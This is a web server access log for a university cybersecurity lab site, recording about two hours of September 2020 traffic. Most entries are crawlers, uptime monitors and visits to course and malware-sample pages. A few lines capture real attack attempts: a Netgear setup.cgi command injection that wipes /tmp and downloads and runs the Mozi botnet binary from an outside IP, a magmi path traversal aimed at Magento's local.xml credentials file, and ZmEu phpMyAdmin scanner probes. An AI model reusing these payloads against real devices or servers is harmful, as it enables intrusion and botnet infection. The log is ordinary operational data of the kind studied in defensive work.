185.191.171.35 - - [23/Sep/2020:09:19:42 +0000] "GET /resources/lab-network-quarantine HTTP/1.1" 200 11327 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
104.238.136.194 - - [23/Sep/2020:09:21:23 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:9002:11a::1 - - [23/Sep/2020:09:21:23 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
77.88.5.7 - - [23/Sep/2020:09:22:15 +0000] "GET /courses/comp293a HTTP/1.1" 200 8804 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
37.233.77.228 - - [23/Sep/2020:09:25:33 +0000] "GET / HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0"
167.248.133.36 - - [23/Sep/2020:09:25:41 +0000] "GET / HTTP/1.1" 404 178 "-" "-"
167.248.133.36 - - [23/Sep/2020:09:25:41 +0000] "GET / HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
192.99.37.47 - - [23/Sep/2020:09:26:20 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2607:5300:60:4c2f::1 - - [23/Sep/2020:09:26:20 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
66.249.79.243 - - [23/Sep/2020:09:27:59 +0000] "GET /courses/cybr200/resources/08.09-cryptography-rng-entropy.pdf HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.121.222.175 - - [23/Sep/2020:09:31:20 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:41d0:2:85af::1 - - [23/Sep/2020:09:31:20 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
66.249.79.245 - - [23/Sep/2020:09:32:26 +0000] "GET /resources/lab-network-hardware HTTP/1.1" 200 10587 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.243 - - [23/Sep/2020:09:32:51 +0000] "GET /courses/cybr200/resources/08.12-cryptography-developer-mistakes.pdf HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.36.148.71 - - [23/Sep/2020:09:33:08 +0000] "GET /courses/comp175 HTTP/1.1" 200 8811 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
45.63.29.207 - - [23/Sep/2020:09:36:21 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:5801:1d8::1 - - [23/Sep/2020:09:36:21 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
120.63.18.88 - - [23/Sep/2020:09:36:40 +0000] "GET /resources/malware-samples-for-students HTTP/1.1" 200 10202 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:41 +0000] "GET /system/assets/jquery/jquery-2.x.min.js HTTP/1.1" 200 85578 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:41 +0000] "GET /user/plugins/lightslider/js/lightslider.min.js HTTP/1.1" 200 16018 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:42 +0000] "GET /assets/f34339a9d26808defc965517fd93f714.css HTTP/1.1" 200 155416 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:42 +0000] "GET /user/plugins/featherlight/js/featherlight.min.js HTTP/1.1" 200 8670 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:42 +0000] "GET /user/plugins/gantry5/assets/js/main.js HTTP/1.1" 200 60610 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:42 +0000] "GET /user/plugins/simplesearch/js/simplesearch.js HTTP/1.1" 200 1277 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:43 +0000] "GET /user/plugins/highlight/js/highlight.pack.js HTTP/1.1" 200 101421 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:43 +0000] "GET /user/themes/g5_helium/fonts/raleway/raleway-regular/raleway-regular-webfont.woff2?5f593174 HTTP/1.1" 200 25424 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:43 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-bold/lato-bold-webfont.woff2?5f593174 HTTP/1.1" 200 25608 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:43 +0000] "GET /user/plugins/gantry5/assets/fonts/fontawesome-webfont.woff2?v=4.7.0 HTTP/1.1" 200 77160 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:44 +0000] "GET /user/themes/g5_helium/fonts/raleway/raleway-bold/raleway-bold-webfont.woff2?5f593174 HTTP/1.1" 200 25368 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:44 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-regular/lato-regular-webfont.woff2?5f593174 HTTP/1.1" 200 25040 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:44 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-black/lato-black-webfont.woff2?5f593174 HTTP/1.1" 200 24632 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
120.63.18.88 - - [23/Sep/2020:09:36:44 +0000] "GET /user/images/g5_helium/favicon.ico HTTP/1.1" 200 5430 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
38.76.17.160 - - [23/Sep/2020:09:36:44 +0000] "GET /app/etc/local.xml HTTP/1.1" 404 178 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/12F70 Safari/600.1.4"
38.76.17.160 - - [23/Sep/2020:09:36:55 +0000] "GET /magmi/web/download_file.php?file=../../app/etc/local.xml HTTP/1.1" 404 178 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/12F70 Safari/600.1.4"
38.76.17.160 - - [23/Sep/2020:09:37:05 +0000] "GET /js/webforms/upload/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/12F70 Safari/600.1.4"
66.249.79.245 - - [23/Sep/2020:09:37:12 +0000] "GET /courses/cybr200/resources/08.09-cryptography-rng-entropy.pdf HTTP/1.1" 200 5577632 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
38.76.17.160 - - [23/Sep/2020:09:37:18 +0000] "GET /magmi/web/magmi.php HTTP/1.1" 404 178 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/12F70 Safari/600.1.4"
66.249.79.245 - - [23/Sep/2020:09:37:36 +0000] "GET /courses/cybr200/resources/08.12-cryptography-developer-mistakes.pdf HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.247 - - [23/Sep/2020:09:39:11 +0000] "GET /courses HTTP/1.1" 200 9700 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.243 - - [23/Sep/2020:09:39:20 +0000] "GET /courses/cybr200/resources/Crypto101.pdf HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.243 - - [23/Sep/2020:09:40:56 +0000] "GET /courses/cybr210 HTTP/1.1" 200 8769 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.238.136.194 - - [23/Sep/2020:09:41:19 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:9002:11a::1 - - [23/Sep/2020:09:41:20 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:6001:2c6::1 - - [23/Sep/2020:09:46:17 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.32.74.41 - - [23/Sep/2020:09:46:17 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:4400:402e::1 - - [23/Sep/2020:09:51:15 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.32.107.181 - - [23/Sep/2020:09:51:15 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.32.74.41 - - [23/Sep/2020:09:56:11 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:6001:2c6::1 - - [23/Sep/2020:09:56:11 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
66.249.79.247 - - [23/Sep/2020:09:56:30 +0000] "GET /resources/reverse-engineering-cheat-sheets HTTP/1.1" 200 9037 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
68.204.133.164 - - [23/Sep/2020:09:57:36 +0000] "GET /user/pages/04.resources/lab-network-hardware/ccr1009-7g-1c-1splus-diagram.png HTTP/1.1" 200 62886 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
42.235.155.224 - - [23/Sep/2020:09:58:27 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.235.155.224:54952/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 194 "-" "-"
45.76.104.117 - - [23/Sep/2020:10:01:10 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:7001:45a::1 - - [23/Sep/2020:10:01:10 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
104.238.159.87 - - [23/Sep/2020:10:06:09 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:6c01:145::1 - - [23/Sep/2020:10:06:09 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:7001:45a::1 - - [23/Sep/2020:10:11:08 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.76.104.117 - - [23/Sep/2020:10:11:08 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
54.36.148.154 - - [23/Sep/2020:10:15:52 +0000] "GET /courses/comp293a/labs/lab-3-behavioral-analysis-tools HTTP/1.1" 200 11871 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.149.51 - - [23/Sep/2020:10:15:53 +0000] "GET /courses/comp293a/labs/lab-9-anti-re-2 HTTP/1.1" 200 14598 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
2001:19f0:6c01:145::1 - - [23/Sep/2020:10:16:07 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
104.238.159.87 - - [23/Sep/2020:10:16:07 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
66.249.79.245 - - [23/Sep/2020:10:17:05 +0000] "GET /courses/comp177/labs HTTP/1.1" 200 9236 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
2001:19f0:7001:45a::1 - - [23/Sep/2020:10:21:06 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.76.104.117 - - [23/Sep/2020:10:21:06 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
114.119.154.13 - - [23/Sep/2020:10:21:27 +0000] "GET /images/a/e/1/f/4/ae1f495c81bbe3fd06ac9f15b0663a172c91f7fd-networkphysical1x.png HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
2001:19f0:5801:1d8::1 - - [23/Sep/2020:10:26:03 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.63.29.207 - - [23/Sep/2020:10:26:04 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2.57.122.212 - - [23/Sep/2020:10:27:26 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 152 "-" "ZmEu"
2.57.122.212 - - [23/Sep/2020:10:27:26 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
2.57.122.212 - - [23/Sep/2020:10:27:27 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
2.57.122.212 - - [23/Sep/2020:10:27:27 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
2.57.122.212 - - [23/Sep/2020:10:27:28 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
2.57.122.212 - - [23/Sep/2020:10:27:28 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
2001:19f0:7001:45a::1 - - [23/Sep/2020:10:31:02 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.76.104.117 - - [23/Sep/2020:10:31:02 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
66.249.79.245 - - [23/Sep/2020:10:33:04 +0000] "GET /resources/reverse-engineering-malware-toolkits HTTP/1.1" 200 11064 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.5.7 - - [23/Sep/2020:10:33:35 +0000] "GET /courses/comp175 HTTP/1.1" 200 8804 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
104.238.159.87 - - [23/Sep/2020:10:36:00 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:6c01:145::1 - - [23/Sep/2020:10:36:00 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
157.55.39.16 - - [23/Sep/2020:10:38:09 +0000] "GET /robots.txt HTTP/1.1" 200 197 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
2001:19f0:9002:11a::1 - - [23/Sep/2020:10:40:59 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
104.238.136.194 - - [23/Sep/2020:10:41:00 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
114.119.130.62 - - [23/Sep/2020:10:41:55 +0000] "GET /resources/lab-network-monitoring HTTP/1.1" 200 12017 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
86.13.114.54 - - [23/Sep/2020:10:45:11 +0000] "GET /resources/malware-samples-for-students HTTP/1.1" 200 10202 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:11 +0000] "GET /system/assets/jquery/jquery-2.x.min.js HTTP/1.1" 200 85578 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:11 +0000] "GET /assets/f34339a9d26808defc965517fd93f714.css HTTP/1.1" 200 155416 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:11 +0000] "GET /user/plugins/lightslider/js/lightslider.min.js HTTP/1.1" 200 16018 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:11 +0000] "GET /user/plugins/highlight/js/highlight.pack.js HTTP/1.1" 200 101421 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:11 +0000] "GET /user/plugins/featherlight/js/featherlight.min.js HTTP/1.1" 200 8670 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:11 +0000] "GET /user/plugins/gantry5/assets/js/main.js HTTP/1.1" 200 60610 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:11 +0000] "GET /user/plugins/simplesearch/js/simplesearch.js HTTP/1.1" 200 1277 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:12 +0000] "GET /user/themes/g5_helium/fonts/raleway/raleway-regular/raleway-regular-webfont.woff2?5f593174 HTTP/1.1" 200 25424 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:12 +0000] "GET /user/themes/g5_helium/fonts/raleway/raleway-bold/raleway-bold-webfont.woff2?5f593174 HTTP/1.1" 200 25368 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:12 +0000] "GET /user/plugins/gantry5/assets/fonts/fontawesome-webfont.woff2?v=4.7.0 HTTP/1.1" 200 77160 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:12 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-regular/lato-regular-webfont.woff2?5f593174 HTTP/1.1" 200 25040 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:12 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-black/lato-black-webfont.woff2?5f593174 HTTP/1.1" 200 24632 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:12 +0000] "GET /user/themes/g5_helium/fonts/lato/lato-bold/lato-bold-webfont.woff2?5f593174 HTTP/1.1" 200 25608 "https://cyberlab.pacific.edu/assets/f34339a9d26808defc965517fd93f714.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
86.13.114.54 - - [23/Sep/2020:10:45:12 +0000] "GET /user/images/g5_helium/favicon.ico HTTP/1.1" 200 5430 "https://cyberlab.pacific.edu/resources/malware-samples-for-students" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
2001:19f0:7001:45a::1 - - [23/Sep/2020:10:45:59 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.76.104.117 - - [23/Sep/2020:10:45:59 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
104.238.159.87 - - [23/Sep/2020:10:50:58 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:6c01:145::1 - - [23/Sep/2020:10:50:58 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
139.162.116.133 - - [23/Sep/2020:10:54:26 +0000] "GET / HTTP/1.1" 200 44696 "-" "HTTP Banner Detection (https://security.ipip.net)"
104.238.136.194 - - [23/Sep/2020:10:55:55 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:9002:11a::1 - - [23/Sep/2020:10:55:55 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
1.250.65.219 - - [23/Sep/2020:10:56:55 +0000] "GET /resources/malware-samples-for-students HTTP/1.1" 200 10202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
1.250.65.219 - - [23/Sep/2020:10:57:17 +0000] "GET /resources/malware-samples-for-students HTTP/1.1" 200 10202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
66.249.79.245 - - [23/Sep/2020:10:58:32 +0000] "GET /courses/cybr200/labs/lab-cryptography-nacl HTTP/1.1" 200 11459 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.243 - - [23/Sep/2020:10:59:05 +0000] "GET /courses/cybr230/syllabus HTTP/1.1" 200 12632 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.243 - - [23/Sep/2020:10:59:20 +0000] "GET /courses/comp293a/labs/lab-2-static-analysis-tools HTTP/1.1" 200 12936 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.243 - - [23/Sep/2020:10:59:36 +0000] "GET /courses/cybr230/projects/project3 HTTP/1.1" 200 10827 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
2001:19f0:5801:1d8::1 - - [23/Sep/2020:11:00:53 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.63.29.207 - - [23/Sep/2020:11:00:53 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
104.238.159.87 - - [23/Sep/2020:11:05:50 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:6c01:145::1 - - [23/Sep/2020:11:05:50 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
114.119.152.54 - - [23/Sep/2020:11:06:55 +0000] "GET /images/b/3/f/c/b/b3fcbf5aec6f08917bf1e1e63afc3b961ad313fc-ccr10091x.png HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
91.121.222.175 - - [23/Sep/2020:11:10:49 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:41d0:2:85af::1 - - [23/Sep/2020:11:10:49 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
192.99.37.116 - - [23/Sep/2020:11:12:00 +0000] "GET /robots.txt HTTP/1.1" 200 197 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
192.99.37.116 - - [23/Sep/2020:11:12:13 +0000] "GET /resources/lab-network-monitoring HTTP/1.1" 200 12017 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
192.99.37.116 - - [23/Sep/2020:11:12:21 +0000] "GET /resources/security-and-privacy-news HTTP/1.1" 200 9063 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
